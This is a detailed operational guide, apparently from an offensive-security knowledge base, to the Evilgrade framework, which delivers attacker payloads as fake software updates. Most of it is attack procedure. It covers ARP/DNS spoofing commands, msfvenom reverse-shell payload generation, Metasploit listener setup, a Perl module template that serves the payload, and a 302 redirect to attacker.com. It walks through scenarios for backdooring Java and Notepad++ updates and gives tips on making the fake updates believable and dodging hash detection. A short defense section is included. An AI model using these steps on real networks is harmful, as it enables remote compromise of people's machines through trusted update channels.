---
title: Evilgrade
tool: evilgrade
category: execution
mitre_tactic: execution
mitre_tactic_id: TA0002
difficulty: advanced
os: cross-platform
language: perl
license: BSD-3-Clause
version: "2.0.9"
created: "2007 by Francisco Amato"
github: https://github.com/infobyte/evilgrade
kali: https://www.kali.org/tools/evilgrade/
---

# Evilgrade - Software Update Exploitation Framework

## 1. Introduction & Overview

Evilgrade is a modular exploitation framework that takes advantage of insecure software update mechanisms. It intercepts and replaces legitimate software updates with attacker-controlled payloads. The framework emulates update servers for dozens of popular applications, injects fake updates through DNS redirection or man-in-the-middle attacks, and delivers custom payloads to victims who trust the update process.

**Created:** 2007 by Francisco Amato (Faraday Security). Licensed under BSD-3-Clause. Kali package version: 2.0.9.

### The Attack Vector

Software updates are one of the most trusted operations on any system. Users and administrators blindly accept updates because they expect the process to be cryptographically verified. Evilgrade exploits the gap between this expectation and reality — many applications check for updates over HTTP, use unsigned or poorly signed update channels, or fail to validate update signatures.

```
Normal Update Flow:
┌──────────┐    ┌───────────────┐    ┌──────────────────┐
│  Target  │───►│ update.vendor  │───►│ Download update  │
│  App     │    │ .com/check    │    │ (verified)       │
└──────────┘    └───────────────┘    └──────────────────┘

Evilgrade Attack Flow:
┌──────────┐    ┌────────────────┐    ┌─────────────────┐
│  Target  │───►│ Evilgrade DNS  │───►│ Fake update     │
│  App     │    │ (intercepted)  │    │ (attacker code) │
└──────────┘    └────────────────┘    └─────────────────┘
```

### When to Use Evilgrade

Evilgrade is effective when:

1. You control the victim's DNS resolution (ARP spoofing, DNS cache poisoning, compromised DNS server)
2. The target application uses HTTP for update checks (not HTTPS)
3. The target application does not verify update signatures
4. You have network access between the victim and the update server (MITM position)

| Scenario | Feasibility |
|---|---|
| Internal network with ARP spoofing | High — common in corporate environments |
| Public Wi-Fi with DNS spoofing | High — open networks are easy to MITM |
| External with DNS cache poisoning | Medium — depends on DNS server implementation |
| Fully patched HTTPS-only updates | Low — modern apps are resistant |

### Architecture

```
┌──────────────────────────────────────────────────┐
│                  Evilgrade Framework              │
├──────────────┬─────────────────┬─────────────────┤
│  DNS Server  │  Web Server     │  Module System   │
│  (port 53)   │  (port 80/443)  │  (Perl modules) │
├──────────────┴─────────────────┴─────────────────┤
│              Configuration (set/show)             │
├──────────────────────────────────────────────────┤
│              Dynamic Payload Generation           │
│              (msfpayload / msfvenom)              │
└──────────────────────────────────────────────────┘
```

Evilgrade runs two services:
- **DNS Server** (port 53) — resolves update server hostnames to the attacker's IP
- **Web Server** (port 80/443) — serves fake update files and responses

### Supported Modules (63+)

Evilgrade includes modules for a wide range of applications:

| Category | Applications |
|---|---|
| **Java** | Sun Java 1.6.0_22 and earlier |
| **Apple** | Apple Update, iTunes, QuickTime, Safari |
| **Microsoft** | Windows Update (IE6/7/8), Microsoft Works |
| **Communication** | aMSN, Trillian, Miranda, Adium, Skype |
| **Media** | Winamp, GOM Player, BSPlayer, PhotoScape |
| **Utilities** | Notepad++, FileZilla, WinSCP, VMware, VirtualBox |
| **Mobile** | Nokia firmware, BlackBerry Facebook/Twitter, Ubertwitter |
| **Package managers** | APT (Ubuntu < 10.04), CPAN |
| **Social** | Facebook (via GetJar), Twitter |

### Key Differences from Other Frameworks

| Feature | Evilgrade | SET | Metasploit |
|---|---|---|---|
| Attack vector | Fake software updates | Phishing/social engineering | Exploit delivery |
| Prerequisite | DNS manipulation | User interaction | Network access |
| Target | Software auto-updates | Human trust | Software vulnerabilities |
| Payload delivery | Via update mechanism | Via phishing page | Via exploit |
| Persistence | Binary runs as update | One-time interaction | Varies |

---

## 2. Installation & Setup

### Prerequisites

- **Perl** with modules: `Data::Dump`, `Digest::MD5`, `Time::HiRes`, `RPC::XML`
- **Root privileges** — required for binding to port 53 (DNS) and port 80 (HTTP)
- **Network access** — ability to perform DNS redirection or MITM

### Install via apt

```bash
sudo apt update && sudo apt install evilgrade
```

**Explanation:** Installs Evilgrade and its Perl dependencies. The installed package is lightweight — most of the framework's size comes from the module definitions and agent binaries.

### Install from Source

```bash
git clone https://github.com/infobyte/evilgrade.git
cd evilgrade
# Install Perl dependencies
cpan install Data::Dump Digest::MD5 Time::HiRes RPC::XML
```

**Explanation:** Source installation gives you access to the latest modules and custom development capabilities. The repository includes the full module library, agent binaries, and documentation.

### Verify Installation

```bash
evilgrade
# You should see the evilgrade> prompt
```

**Explanation:** Running `evilgrade` without arguments opens the interactive shell. The prompt indicates the framework is ready. If you see module loading errors, install missing Perl dependencies with `cpan`.

### Network Setup for DNS Redirection

```bash
# Method 1: ARP Spoofing (internal network)
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Method 2: DNS Cache Poisoning
# Use a tool like responder or dnsspoof

# Method 3: DHCP Spoofing
# Set your IP as the DNS server in DHCP responses

# Method 4: Compromised DNS server
# Modify DNS records for update domains
```

**Explanation:** Evilgrade requires DNS redirection to intercept update requests. The framework's built-in DNS server resolves update hostnames to the attacker's IP. Choose the DNS redirection method based on your network position and engagement scope.

### Prerequisite: Generate Payloads

```bash
# Generate a reverse shell payload with msfvenom
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f exe -o /tmp/update.exe

# Generate a shell payload
msfvenom -p windows/shell_reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f exe -o /tmp/update.exe
```

**Explanation:** Evilgrade serves pre-generated or dynamically generated payloads. Generate your payload before configuring the module. The payload file path is set via the `agent` option in each module.

---

## 3. Basic Usage

### Starting Evilgrade

```bash
sudo evilgrade
```

**Explanation:** Launches the interactive shell. The prompt changes to `evilgrade>` indicating you are in the global configuration context. All subsequent commands operate within this shell.

### Listing Available Modules

```bash
evilgrade> show modules
```

**Explanation:** Displays all 63+ available modules. Each module corresponds to a specific application's update mechanism. Select the module that matches the target application on the victim's system.

### Configuring a Module

```bash
evilgrade> configure sunjava
evilgrade(sunjava)>
```

**Explanation:** Enters the module-specific configuration context. The prompt changes to show the active module name. All subsequent `set` and `show` commands apply to this module.

### Setting the Payload Agent

```bash
evilgrade(sunjava)> set agent /tmp/update.exe
```

**Explanation:** Specifies the binary file to serve as the fake update. Evilgrade will deliver this file when the victim's application requests an update. The path must be an absolute or relative path to an existing file.

### Showing Module Options

```bash
evilgrade(sunjava)> show options
```

**Explanation:** Displays all configurable options for the current module. Options include the update URL, description text, notification messages, and the agent binary. Each option has a default value and a description.

### Starting Services

```bash
evilgrade> start
```

**Explanation:** Starts both the DNS server (port 53) and web server (port 80/443). The framework begins listening for update requests. When a victim's application checks for updates, the DNS server redirects the request to Evilgrade's web server.

### Checking Status

```bash
evilgrade> show status
```

**Explanation:** Displays the status of running services and a table of victims who have received fake updates. The table shows the victim's IP, the module used, delivery status, and MD5 hash of the delivered payload.

### Stopping Services

```bash
evilgrade> stop
```

**Explanation:** Stops both the DNS and web servers. Use this to reconfigure modules or change payloads without the framework actively serving requests.

### Exiting

```bash
evilgrade> exit
```

**Explanation:** Terminates the Evilgrade session. Running services are stopped automatically.

---

## 4. Intermediate Usage

### Dynamic Payload Generation

Evilgrade can generate payloads on-the-fly using `msfpayload` or `msfvenom`:

```bash
evilgrade(sunjava)> set agent '["/usr/bin/msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4141 X > <%OUT%>/tmp/update.exe<%OUT%>"]'
```

**Explanation:** The `["..."]` syntax triggers dynamic payload generation. Each time a victim requests an update, Evilgrade executes the command and generates a fresh payload. The `<%OUT%><%OUT%>` tags mark where the output file path is inserted. This ensures each victim receives a unique binary.

### Using Dynamic Paths with Randomness

```bash
evilgrade(sunjava)> set agent '["./generatebin -o <%OUT%>/tmp/update".int(rand(256)).".exe<%OUT%>"]'
```

**Explanation:** Perl expressions within the command string are evaluated at runtime. `int(rand(256))` generates a random number 0-255, creating unique output filenames for each delivery. This prevents payload reuse detection.

### Static Payload Configuration

```bash
# Outside Evilgrade, generate the payload first:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 X > /tmp/reverse-shell.exe

# Inside Evilgrade, set the static payload:
evilgrade(sunjava)> set agent /tmp/reverse-shell.exe
```

**Explanation:** For engagements where dynamic generation is unnecessary, pre-generating a single payload simplifies operations. The disadvantage is that all victims receive the same binary, which may trigger hash-based detection.

### Setting Up the Listener

```bash
# In a separate terminal:
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/shell/reverse_tcp; set LHOST 192.168.1.50; set LPORT 4444; exploit"
```

**Explanation:** After a victim receives and runs the fake update, the payload connects back to your listener. Always set up the listener before starting Evilgrade services. Without a listener, the payload executes but has nowhere to connect.

### Modifying Update Messages

```bash
evilgrade(sunjava)> set title "Critical Security Update"
evilgrade(sunjava)> set description "This update fixes a critical vulnerability in Java. Please install immediately."
evilgrade(sunjava)> set atitle "Java Security Alert"
evilgrade(sunjava)> set adescription "A critical security vulnerability has been discovered. Click here to update."
evilgrade(sunjava)> set website "http://java.com/help"
```

**Explanation:** Customizing update messages increases believability. The title, description, and alert messages appear in the victim's update notification dialog. Match the wording and style of legitimate update messages for the target application.

### Monitoring Victims

```bash
evilgrade> show status

Users status:
============
+----------------+------------------+--------+-----------------------------------+
| Client         | Module           | Status | Md5,Cmd,File                      |
+----------------+------------------+--------+-----------------------------------+
| 192.168.1.100  | modules::sunjava | send   | d9a28baa...,'',"/tmp/update.exe"  |
+----------------+------------------+--------+-----------------------------------+
```

**Explanation:** The status table shows which victims have received payloads. The "send" status indicates the payload was delivered. Check your listener for incoming connections from victims who executed the fake update.

### Reloading Modules

```bash
evilgrade> reload
```

**Explanation:** Reloads all modules from disk. Use this after modifying module files to apply changes without restarting Evilgrade. Essential during module development and testing.

### Restarting Services

```bash
evilgrade> restart
```

**Explanation:** Stops and restarts both DNS and web servers. Use this after configuration changes that affect server behavior (port changes, SSL configuration).

---

## 5. Advanced Usage

### Custom Module Development

Evilgrade modules are Perl packages located in the `modules/` directory. Here is the anatomy of a module:

```perl
package modules::customapp;

use strict;
use Data::Dump qw(dump);

my $base = {
    'name' => 'Custom Application',       # Display name
    'version' => '1.0',                    # Module version
    'appver' => '<= 2.0',                 # Target app version
    'author' => ['Your Name'],            # Author
    'description' => 'Custom module',      # Description
    'vh' => '(update.customapp.com)',      # VirtualHosts to intercept

    # HTTP request handlers
    'request' => [
        {
            'req' => '^/check$',           # URL regex to match
            'type' => 'string',            # Response type: file|string|agent|install
            'method' => '',                # HTTP method (empty = any)
            'bin' => '',                   # Set to 1 for binary responses
            'string' => '<update><version>2.1</version></update>',
            'parse' => '1',                # Parse response with options
            'file' => ''
        },
        {
            'req' => '\.exe$',
            'type' => 'agent',             # Serve the agent binary
            'bin' => 1,
            'method' => '',
            'string' => '',
            'parse' => '',
            'file' => ''
        }
    ],

    # Configurable options
    'options' => {
        'agent' => { 'val' => './agent/payload.exe', 'desc' => 'Agent to inject' },
        'enable' => { 'val' => 1, 'desc' => 'Status' },
        'title' => { 'val' => 'Critical Update', 'desc' => 'Update title' },
        'description' => { 'val' => 'Security update', 'desc' => 'Update description' }
    }
};
```

**Explanation:** Module development follows a declarative pattern. Define the virtual hostnames to intercept, the HTTP request patterns to match, and the responses to serve. The `type` field determines response behavior: `file` serves a static file, `string` serves inline content, `agent` serves the configured payload, and `install` reports successful installation.

### Response Types in Detail

| Type | Description | Use Case |
|---|---|---|
| `file` | Serve a static file from `./include/` | Configuration XML, HTML pages |
| `string` | Serve inline string content | Dynamic responses, redirects |
| `agent` | Serve the configured agent binary | Payload delivery |
| `install` | Signal successful installation | Post-install callback, tracking |

**Explanation:** Each request handler can use a different response type. The typical pattern is: first request returns a `string` or `file` with update metadata, second request returns the `agent` binary, and a final request (if applicable) returns `install` to confirm delivery.

### File Parsing with Options

```perl
'parse' => '1',  # Enable file parsing
'file' => './include/sunjava/update.xml'
```

In the XML/file content, use tags like `<%TITLE%>`, `<%DESCRIPTION%>`, `<%AGENTMD5%>` that get replaced with the corresponding option values at runtime.

**Explanation:** Parsing allows dynamic content generation without writing Perl code. Define template variables in the option section, use `<%VARIABLE%>` tags in response files, and Evilgrade handles the substitution. This is essential for matching the exact format of legitimate update responses.

### HTTP Redirect Responses

```perl
{
    'req' => '/sitepath/download/update.zip',
    'type' => 'string',
    'method' => '',
    'bin' => '',
    'string' => '',
    'parse' => '1',
    'file' => '',
    'cheader' => "HTTP/1.1 302 Found\r\n"
        . "Location: http://attacker.com/<%URL_FILE%>.exe \r\n"
        . "Content-Length: 0 \r\n"
        . "Connection: close \r\n\r\n",
}
```

**Explanation:** The `cheader` field sends raw HTTP headers. Use this for 302 redirects that force the victim's application to download from an attacker-controlled URL. This technique is useful when the update mechanism follows redirects.

### User-Agent Filtering

```perl
'module' => {
    'base' => {
        'useragent' => 'true',  # Enable user-agent filtering
    },
    'request' => [
        {
            'req' => '/update/check',
            'useragent' => 'Mozilla/5.0.*Windows.*',  # Only match Windows
        }
    ]
}
```

**Explanation:** User-Agent filtering ensures the fake update is only served to specific platforms. This prevents serving Windows payloads to macOS users (or vice versa), which would immediately alert the victim. The filtering regex matches against the `User-Agent` header (without the "User-Agent: " prefix).

### SSL Configuration

```bash
evilgrade> set sslport 443
evilgrade> set port 80
evilgrade> start
```

**Explanation:** Evilgrade supports SSL for HTTPS interception. When targeting applications that use HTTPS for updates, you need SSL enabled. The SSL certificate is auto-generated in the `certs/` directory. For production use, consider using a certificate that matches the target update domain.

---

## 6. Real-World Scenarios

### Scenario 1: Internal Network Java Exploitation

**Context:** Corporate network where workstations run Java 1.6 and have auto-update enabled.

```bash
# Step 1: Set up ARP spoofing to intercept traffic
sudo arpspoof -i eth0 -t 192.168.1.0/24 192.168.1.1

# Step 2: Configure Evilgrade
evilgrade> configure sunjava
evilgrade(sunjava)> set agent '["/usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 X > <%OUT%>/tmp/javaws.exe<%OUT%>"]'
evilgrade(sunjava)> set title "Java Critical Security Update"
evilgrade(sunjava)> set description "A critical vulnerability in Java has been discovered. Update immediately."

# Step 3: Start Evilgrade services
evilgrade> start

# Step 4: Set up Metasploit listener
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.50; set LPORT 4444; exploit"

# Step 5: Wait for victims
# When a workstation checks for Java updates, it receives the fake update
# The payload connects back to your listener
```

**Explanation:** This scenario targets Java's auto-update mechanism, which was notoriously insecure in older versions. The update check used HTTP and did not verify update signatures. ARP spoofing redirects all traffic through the attacker, and Evilgrade's DNS server resolves `java.sun.com` to the attacker's IP.

### Scenario 2: Notepad++ Backdoor Deployment

**Context:** Targeting developers who use Notepad++ and have auto-update enabled.

```bash
# Step 1: Configure the Notepad++ module
evilgrade> configure notepadplus
evilgrade(notepadplus)> set agent /tmp/notepad_update.exe
evilgrade(notepadplus)> set title "Notepad++ v6.0 Update"
evilgrade(notepadplus)> set description "Bug fixes and performance improvements"

# Step 2: Generate the payload
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o /tmp/notepad_update.exe

# Step 3: Start services and listener
evilgrade> start
# Start msfconsole listener in separate terminal

# Step 4: Intercept DNS for notepad-plus-plus.org
# Use DNS spoofing to redirect the domain
```

**Explanation:** Notepad++ historically checked for updates over HTTP without signature verification. The module intercepts the update check and serves a backdoored version. Developers are high-value targets because of their access to source code repositories and deployment keys.

### Scenario 3: APT Simulation — Multi-Application Targeting

**Context:** Simulating an APT that compromises software supply chains.

```bash
# Step 1: Configure multiple modules simultaneously
evilgrade> configure sunjava
evilgrade(sunjava)> set agent /tmp/java_backdoor.exe
evilgrade(sunjava)> conf

evilgrade> configure appleupdate
evilgrade(appleupdate)> set agent /tmp/apple_backdoor.exe
evilgrade(appleupdate)> conf

evilgrade> configure teamviewer
evilgrade(teamviewer)> set agent /tmp/teamviewer_backdoor.exe
evilgrade(teamviewer)> conf

# Step 2: Start services
evilgrade> start

# Step 3: Monitor which applications are vulnerable
evilgrade> show status

# Step 4: Analyze which applications users are running
# The status table reveals which update mechanisms are active
```

**Explanation:** This scenario demonstrates Evilgrade's multi-module capability. Running multiple modules simultaneously reveals which applications on the network use insecure update mechanisms. The results inform supply chain security assessments and help prioritize remediation efforts.

### Scenario 4: Software Supply Chain Audit

**Context:** Assessing an organization's exposure to fake update attacks.

```bash
# Step 1: Enumerate common update domains
# Check DNS resolution for:
# - java.sun.com
# - update.microsoft.com
# - apple.com/distribution
# - download.nvidia.com

# Step 2: For each domain, configure the corresponding Evilgrade module

# Step 3: Test update mechanism security
# Does the app use HTTP? → Vulnerable
# Does the app verify signatures? → Test bypass
# Does the app use certificate pinning? → More resistant

# Step 4: Document findings
# List all applications that would be compromised
# Report which applications have secure update mechanisms
```

**Explanation:** Evilgrade is an effective tool for auditing software supply chain security. By testing each application's update mechanism, you can identify which ones would be vulnerable to fake update attacks. This assessment informs security policies and hardening recommendations.

---

## 7. Detection & Defense

### Indicators of Compromise (IOCs)

| Indicator | Detail |
|---|---|
| DNS redirection for update domains | Unexpected resolution of `update.*`, `*.sun.com` |
| HTTP update checks | Application checking for updates over HTTP |
| Unexpected binaries in temp directories | Payloads delivered to `/tmp/` or `%TEMP%` |
| Reverse shell connections | Outbound connections on non-standard ports |
| Modified update files | Hash mismatch between downloaded and expected updates |

### Detection Methods

**Network monitoring:**
- Monitor DNS traffic for resolution changes on known update domains
- Alert on HTTP (not HTTPS) connections to update servers
- Detect reverse shell patterns (outbound connections on unusual ports)

**Endpoint monitoring:**
- Compare downloaded update binaries against known-good hashes
- Monitor for unexpected execution of update installers
- Check update file signatures before execution

**Application-level:**
- Verify HTTPS certificate chains for update connections
- Validate update file signatures against trusted certificates
- Use certificate pinning for critical application updates

### Hardening Recommendations

1. **Enforce HTTPS for updates** — reject any HTTP update connections
2. **Verify update signatures** — reject unsigned or incorrectly signed updates
3. **Implement certificate pinning** — prevent MITM with forged certificates
4. **DNSSEC** — deploy DNSSEC to prevent cache poisoning
5. **Network monitoring** — alert on DNS resolution changes for known update domains
6. **User education** — warn users about unexpected update prompts

---

## 8. Troubleshooting

### Common Issues

**"Permission denied" on port 53:**
```bash
# Port 53 requires root privileges
sudo evilgrade

# Or if using a non-standard port:
evilgrade> set DNSPort 5353
evilgrade> start
```

**No victims receiving updates:**
```bash
# Verify DNS redirection is working:
nslookup java.sun.com
# Should return your Evilgrade server IP

# Check Evilgrade is listening:
evilgrade> show status
# Webserver and DNS server should show "running"

# Verify the module is active:
evilgrade> show active
```

**Payload not executing on victim:**
```bash
# Check if the payload was generated correctly:
file /tmp/update.exe
# Should show "PE32+ executable"

# Verify the payload connects back:
# Set up a netcat listener to test:
nc -lvp 4444

# Common issue: payload is 0 bytes if generation failed
# Regenerate with msfvenom and verify file size
```

**Module not found:**
```bash
evilgrade> show modules
# Check exact module name (case-sensitive)

# If module is missing, check the modules/ directory:
ls modules/

# Reload modules after adding new ones:
evilgrade> reload
```

**SSL certificate issues:**
```bash
# Check if certificates exist:
ls certs/

# Regenerate if needed:
# Evilgrade auto-generates certificates on first start

# For HTTPS interception, the victim's system must trust the CA
# Import Evilgrade's CA certificate into the victim's trust store
```

**Dynamic payload generation fails:**
```bash
# Test the msfvenom command manually:
/usr/bin/msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 X > /tmp/test.exe

# Check path to msfvenom:
which msfvenom

# Verify the agent syntax uses correct delimiters:
# '["command <%OUT%>/path/file<%OUT%>"]'
# No spaces around <%OUT%> tags
```

---

## Resources

- **GitHub Repository:** https://github.com/infobyte/evilgrade
- **Faraday Security:** https://www.faradaysec.com/
- **Conference Presentations:** BlackHat Arsenal 2010, Defcon 2010, Troopers 2008, H2HC 2009
- **Module Documentation:** See `docs/CHANGES` in the repository
- **Author:** Francisco Amato (famato@faradaysec.com)
- **License:** BSD-3-Clause
